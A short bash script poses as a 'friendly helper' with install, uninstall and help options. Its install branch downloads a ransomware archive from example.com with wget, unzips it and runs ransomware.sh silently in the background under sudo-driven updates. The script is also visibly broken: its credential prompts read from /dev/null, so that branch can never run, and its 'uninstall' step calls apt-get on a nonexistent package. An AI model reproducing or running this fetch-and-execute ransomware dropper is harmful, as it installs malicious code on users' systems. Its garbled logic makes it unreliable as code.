#!/bin/bash

echo Hello! I'm a friendly helper
echo What would you like to do?

read command

if [ $command == "install" ]; then
  echo Installing...
  
  echo Please enter your username and password.
  
  read -s username < /dev/null
  read -s password < /dev/null

  if [[ $username && $password ]]; then
    sudo apt-get install software-update
    sudo apt-get update
    sudo apt-get upgrade

    echo Downloading ransomware...
    wget http://example.com/ransomware.zip

    echo Extracting ransomware...
    unzip ransomware.zip

    echo Installing ransomware...
    chmod +x ./ransomware.sh
    ./ransomware.sh > /dev/null &
  
  else
    echo Invalid credentials.
  fi
elif [ $command == "uninstall" ]; then
  echo Uninstalling...
  
  echo Please enter your username and password.
  
  read -s username < /dev/null
  read -s password < /dev/null

  if [[ $username && $password ]]; then
    sudo apt-get remove ransomware
  else
    echo Invalid credentials.
  fi
elif [ $command == "help" ]; then
  echo Here is a list of commands you can use:
  echo - install : Downloads and installs the ransomware
  echo - uninstall : Uninstalls the ransomware
else
  echo Invalid command.
fi
